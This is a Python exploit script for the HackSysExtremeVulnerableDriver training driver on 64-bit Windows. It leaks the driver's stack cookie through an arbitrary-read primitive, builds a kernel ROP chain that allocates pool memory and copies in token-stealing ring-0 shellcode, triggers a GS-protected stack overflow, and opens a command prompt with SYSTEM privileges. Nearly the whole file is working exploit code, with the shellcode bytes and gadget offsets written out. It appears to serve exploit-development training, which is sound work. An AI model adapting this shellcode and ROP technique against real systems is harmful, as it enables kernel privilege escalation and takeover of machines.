import os, sys, time, struct
from subprocess import Popen, CREATE_NEW_CONSOLE
import pefile

from ctypes import *
from ctypes.wintypes import *

DEVICE_NAME = b"\\\\.\\HackSysExtremeVulnerableDriver"
OFF_SEC_COOKIE = 0x3000 # HEVD.sys MD5 = f69de199e292d430de1afb5deb694965
OFF_FROM_ANCHOR = 0x2a8 # the offset is always 0x2a8 (checked by the debugger)
POOLTAG = 0x74616731 # kcaH
OFF_KBUF = 0x20
OFF_ROP1 = 0x40

# print/debug functions

g_debug = False

def info(msg):
    print("[*] {}".format(msg))

def success(msg):
    print("[+] {}".format(msg))
    
def error(msg):
    print("[!] {}".format(msg))

def debug(msg):
    if g_debug:
        print("[D] {}".format(msg))
        OutputDebugStringA(msg.encode() + b"\n")

        
# ctypes errcheck functions

gle = windll.kernel32.GetLastError

def errcheck_bool(res, func, args):
    if not res:
        raise Exception("{} failed. GLE: {}".format(func.__name__, gle()))
    return res

def errcheck_drivername(res, func, args):
    if res == 0:
        raise Exception("{} failed. GLE: {}".format(func.__name__, gle()))
    if res == args[2]:
        raise Exception("{} failed. Buffer too short. GLE: {}".format(func.__name__, gle()))
    return res

def errcheck_createfile(res, func, args):
    if res == HANDLE(-1).value:  # INVALID_HANDLE_VALUE
        raise Exception("Failed to open device {}. GLE: {}".format(args[0], gle()))
    return res


# Windows API definitions

GetProcAddress = windll.kernel32.GetProcAddress
GetProcAddress.restype = LPVOID
GetProcAddress.argtypes = [LPVOID, LPCSTR]

LoadLibraryA = windll.kernel32.LoadLibraryA
LoadLibraryA.restype = LPVOID
LoadLibraryA.argtypes = [LPCSTR]

CreateFileA = windll.kernel32.CreateFileA
CreateFileA.restype = HANDLE
# we won't use LPSECURITY_ATTRIBUTES (arg 4) so just use LPVOID
CreateFileA.argtypes = [LPCSTR, DWORD, DWORD, LPVOID, DWORD, DWORD, HANDLE]
CreateFileA.errcheck = errcheck_createfile
# constants for CreateFileA
GENERIC_READ = (1 << 30)
GENERIC_WRITE = (1 << 31)
FILE_SHARE_READ = 1
FILE_SHARE_WRITE = 2
OPEN_EXISTING = 3
FILE_ATTRIBUTE_NORMAL = 0x80

DeviceIoControl = windll.kernel32.DeviceIoControl
DeviceIoControl.restype = BOOL
# we won't use LPOVERLAPPED (arg 8) so just use LPVOID
DeviceIoControl.argtypes = [HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD,
                            POINTER(DWORD), LPVOID]
DeviceIoControl.errcheck = errcheck_bool

OutputDebugStringA = windll.kernel32.OutputDebugStringA
OutputDebugStringA.argtypes = [LPCSTR]
OutputDebugStringA.restype = None # for void

EnumDeviceDrivers = windll.psapi.EnumDeviceDrivers
EnumDeviceDrivers.restype = BOOL
EnumDeviceDrivers.argtypes = [LPVOID, DWORD, POINTER(DWORD)]
EnumDeviceDrivers.errcheck = errcheck_bool

GetDeviceDriverBaseNameA = windll.psapi.GetDeviceDriverBaseNameA
GetDeviceDriverBaseNameA.restype = DWORD
GetDeviceDriverBaseNameA.argtypes = [LPVOID, LPCSTR, DWORD]
GetDeviceDriverBaseNameA.errcheck = errcheck_drivername

SIZE_T = c_size_t
VirtualAlloc = windll.kernel32.VirtualAlloc
VirtualAlloc.restype = LPVOID
VirtualAlloc.argtypes = [LPVOID, SIZE_T, DWORD, DWORD]
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040

DebugBreak = windll.kernel32.DebugBreak
DebugBreak.restype = None

CloseHandle = windll.kernel32.CloseHandle
CloseHandle.restype = BOOL
CloseHandle.argtypes = [HANDLE]


# utility funcs for IOCTL code

METHOD_NEITHER = 3
FILE_ANY_ACCESS = 0
FILE_DEVICE_UNKNOWN = 0x00000022

def CTL_CODE(DeviceType, Function, Method, Access):
    return (DeviceType << 16) | (Access << 14) | (Function << 2) | Method

def IOCTL(Function):
    return CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)

HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS = IOCTL(0x801) # 0x222007
HEVD_IOCTL_ARBITRARY_WRITE = IOCTL(0x802) # 0x22200B


# exploit functions

def get_device_handle(device):
    return CreateFileA(device, GENERIC_READ | GENERIC_WRITE,
                       FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING,
                       FILE_ATTRIBUTE_NORMAL, None)

def get_driver_base(the_name):
    lpcbNeeded = DWORD()
    EnumDeviceDrivers(None, 0, byref(lpcbNeeded))
    
    num_of_mods = int(lpcbNeeded.value / sizeof(LPVOID))
    array = (LPVOID * num_of_mods)()
    EnumDeviceDrivers(byref(array), lpcbNeeded, byref(lpcbNeeded))
    
    for ImageBase in array:
        lpFilename = LPSTR(b'\x00'*260)
        GetDeviceDriverBaseNameA(ImageBase, lpFilename, 260)
        #debug('{:#x}: {}'.format(ImageBase, lpFilename.value.decode()))
        
        if the_name in lpFilename.value.lower():
            return ImageBase, lpFilename.value
        
    else:
        return None, None

class WriteWhatWhere(Structure):
    _fields_ = [
        ("What", c_void_p),  # void pointer, we got this by reversing driver
        ("Where", c_void_p)  # void pointer, we got this by reversing driver
    ]

def read(device_handle, where):
    buffer_size = 0x8
    bytes_returned = c_ulong()

    what = c_void_p()
    write_what_where = WriteWhatWhere()
    write_what_where.What = where
    write_what_where.Where = addressof(what)

    DeviceIoControl(
        device_handle,
        HEVD_IOCTL_ARBITRARY_WRITE,
        byref(write_what_where),
        buffer_size,
        None,
        0,
        byref(bytes_returned),
        None
    )

    return int.from_bytes(what, 'little')

def build_shellcode():
    ring0_shellcode = b"\x90"
    ring0_shellcode += (
                        b"\x90\x90\x90\x90\x90\x90\x90\x90"
                        b"\x90\x90\x90\x90\x90\x90\x90\x90"
                        b"\x90\x90\x90\x90\x90\x90\x90\x90"
                        b"\x90\x90\x90\x90\x90\x90\x90\x90"  # will be overwritten with ROP
                        b"\x50"                              # 00000000:  push rax
                        b"\x51"                              # 00000001:  push rcx
                        b"\x52"                              # 00000002:  push rdx
                        b"\x48\x31\xc0"                      # 00000003:  xor rax,rax
                        b"\x65\x48\x8b\x80\x88\x01\x00\x00"  # 00000006:  mov rax,[gs:rax+0x188]
                        b"\x48\x8b\x80\xb8\x00\x00\x00"      # 0000000E:  mov rax,[rax+0xb8]
                        b"\x48\x89\xc1"                      # 00000015:  mov rcx,rax
                        b"\xba\x04\x00\x00\x00"              # 00000018:  mov edx,0x4
                        b"\x48\x8b\x80\xf0\x02\x00\x00"      # 0000001D:  mov rax,[rax+0x2f0]
                        b"\x48\x2d\xf0\x02\x00\x00"          # 00000024:  sub rax,0x2f0
                        b"\x48\x39\x90\xe8\x02\x00\x00"      # 0000002A:  cmp [rax+0x2e8],rdx
                        b"\x75\xea"                          # 00000031:  jnz 0x1d
                        b"\x48\x8b\x90\x60\x03\x00\x00"      # 00000033:  mov rdx,[rax+0x360]
                        b"\x48\x89\x91\x60\x03\x00\x00"      # 0000003A:  mov [rcx+0x360],rdx
                        b"\x5a"                              # 00000041:  pop rdx
                        b"\x59"                              # 00000042:  pop rcx
                        b"\x58"                              # 00000043:  pop rax
                        b"\x4d\x31\xe4"                      # 00000044:  xor r12,r12
                        b"\x48\x83\xc4\x78"                  # 00000047:  add rsp,byte +0x78
                        b"\xc3"                              # 0000004B:  ret
                        )

    return ring0_shellcode
'''
    lpAddress = None
    flAllocationType = (MEM_RESERVE | MEM_COMMIT)
    flProtect = PAGE_EXECUTE_READWRITE
    dwSize = len(ring0_shellcode)

    sc = VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)
    memmove(sc, ring0_shellcode, len(ring0_shellcode))
    return sc
'''

def get_security_cookie(device_handle, base):
    _data_cookie_addr = base + OFF_SEC_COOKIE
    return read(device_handle, _data_cookie_addr)

def GetProcAddressAbsolute(hmodule, realbase, symbol):
    return GetProcAddress(hmodule, symbol) - hmodule + realbase

def to_qword(value):
    return (value).to_bytes(8, 'little')

def build_kernel_payload_rop_chain(kernel_base, kernel_name, sc):
    rop = b''
    sc_addr = cast(sc, LPVOID).value

    kbase_user = LoadLibraryA(kernel_name)
    ExAllocatePoolWithTag = GetProcAddressAbsolute(kbase_user, kernel_base, b'ExAllocatePoolWithTag')
    memcpy = GetProcAddressAbsolute(kbase_user, kernel_base, b'memcpy')

    rop_nop = to_qword(kernel_base + 0x1083) # ret;
    dummy = to_qword(0xbaadf00dbaadf00d)

    #rop += to_qword(kernel_base + ) #
    rop += to_qword(kernel_base + 0x2b1bc)  # pop rcx; ret;
    rop += to_qword(0)                      # arg1: PoolType (NonPagedPool)
    rop += to_qword(kernel_base + 0x21c6c2) # pop rdx; ret;
    rop += to_qword(len(sc))                # arg2: shellcode length
    rop += to_qword(kernel_base + 0x132a97) # pop r8; ret;
    rop += to_qword(POOLTAG)                # arg3: Tag (Hack)
    rop += to_qword(ExAllocatePoolWithTag)  # API1: ExAllocatePoolWithTag API address

    rop += to_qword(kernel_base + 0x3505de) # add rsp, 0x20; ret;
    rop += dummy * 4                        # will be corrupted during the execution

    rop += to_qword(kernel_base + 0x85fc6)  # pop rbx; pop rcx; ret;
    rop += dummy                            # will be corrupted during the execution
    rop += to_qword(0)                      # arg1: rcx = 0 (allocated addr will be added)
    rop += rop_nop
    #rop += to_qword(kernel_base + 0x2b1bc)  # pop rcx; ret;
    #rop += to_qword(0)                      # arg1: rcx = 0 (allocated addr will be added)

    rop += to_qword(kernel_base + 0x2884d3) # add rsp, 0xb8; ret;
    rop += dummy * 23                       # will be corrupted during the execution
        
    rop += to_qword(kernel_base + 0x21c6c2) # pop rdx; ret;
    rop += to_qword(sc_addr)                # any writable address (allocated addr will be assigned at +0x18)

    rop += to_qword(kernel_base + 0x3505de) # add rsp, 0x20; ret;
    rop += dummy * 4                        # will be corrupted during the execution
    
    rop += to_qword(kernel_base + 0xb4180)  # add rcx, rax; mov qword ptr [rdx + 0x18], rcx; ret;
    rop += to_qword(kernel_base + 0x21c6c2) # pop rdx; ret;
    rop += to_qword(sc_addr + 0x20)         # arg2: actual shellcode address
    rop += to_qword(kernel_base + 0x132a97) # pop r8; ret;
    rop += to_qword(len(sc) - 0x20)         # arg3: actual shellcode length
    rop += to_qword(memcpy)                 # API2: memcpy API address
    rop += to_qword(kernel_base + 0x285bb)  # jmp rax (dst of memcpy)

    return rop

def build_stack_pivot_rop_chain(kernel_base, kernel_name, rop1_in_stack):
    rop = b''

    rop += to_qword(kernel_base + 0x1a94)   # pop rsp; ret;
    rop += to_qword(rop1_in_stack)
    
    return rop    
    
def exploit_stack_buffer_overflow():
    info("#0 Getting device handle: {0}".format(DEVICE_NAME).center(100, '-'))
    device_handle = get_device_handle(DEVICE_NAME)

    
    info("#1 Gathering Kernel Information".center(100, '-'))
    kernel_base, kernel_name = get_driver_base(b"krnl")
    #debug_print("\t[*] Loaded Kernel: {0}".format(kernel_name))
    success("Kernel Base Address : {0}".format(hex(kernel_base)))
    hevd_base, hevd_name = get_driver_base(b"hevd")
    success("HEVD Base Address : {0}".format(hex(hevd_base)))
    
    
    info("#2 Calculating the Stack Cookie".center(100, '-'))
    cookie = get_security_cookie(device_handle, hevd_base)
    info("initial cookie value: {:#x}".format(cookie))

    info("Getting the kernel StackLimit values (Sometimes it silently exits. Try again if failed.)")
    import py3_NtQuerySysInfo_SystemProcessInformation as sys_proc_info
    current_pid = sys_proc_info.get_current_pid()
    limits = sys_proc_info.get_process_information(current_pid)
    start, end = limits[0]

    info('Searching down CTL_CODE_ADDRESS from stack limit {:#x}'.format(start))
    #anchor = (HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS).to_bytes(4, 'little')
    anchor = (HEVD_IOCTL_ARBITRARY_WRITE).to_bytes(4, 'little')
    search_addr = start
    while search_addr < end:
        dq = read(device_handle, search_addr)
        bytes_dq = (dq).to_bytes(8, 'little')
        if anchor in bytes_dq:
            anchor_addr = search_addr + bytes_dq.find(anchor)
            break
        search_addr += 8
    else:
        error('CTL_CODE_ADDRESS not found')
        return
    info('CTL_CODE_ADDRESS = {:#x}'.format(anchor_addr))
    rsp = anchor_addr - OFF_FROM_ANCHOR
    info('rsp used for the cookie calculation = {:#x}'.format(rsp))

    the_cookie = cookie ^ rsp
    success('The calculated cookie = {:#x}'.format(the_cookie))
    OutputDebugStringA('The calculated cookie = {:#x}\n'.format(the_cookie).encode())

    
    info("#3 Building shellcode".center(100, '-'))
    sc = build_shellcode()
    sc_addr = cast(sc, LPVOID).value
    debug("shellcode at {:#x}".format(sc_addr))


    info("#4 Building ROP chain".center(100, '-'))
    rop1 = build_kernel_payload_rop_chain(kernel_base, kernel_name, sc)
    rop2 = build_stack_pivot_rop_chain(kernel_base, kernel_name, rsp + OFF_KBUF + OFF_ROP1)
    

    info("#5 Triggering stack buffer overflow".center(100, '-'))
    bytes_returned = c_ulong()
    
    #user_buffer = b"\x41" * 512 + b"\x42" * 8 + b"\x43" * 0x30 + b"\x44" * 8 # \x42 = stack cookie, \44 = ret addr
    user_buffer = b'\x42' * OFF_ROP1 + rop1 + b"\x43" * (0x200 - OFF_ROP1 - len(rop1)) + \
        (the_cookie).to_bytes(8, 'little') + b"\x44" * 0x30 + rop2
    #print('{:#x}'.format(len(rop1))) # 0xb0
    #return
    
    DeviceIoControl(
        device_handle,
        HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS,
        cast(user_buffer, LPVOID),
        len(user_buffer),
        None,
        0,
        byref(bytes_returned),
        None
    )

    CloseHandle(device_handle)

    Popen("cmd.exe", creationflags=CREATE_NEW_CONSOLE, close_fds=True)

if __name__ == "__main__":
    exploit_stack_buffer_overflow()
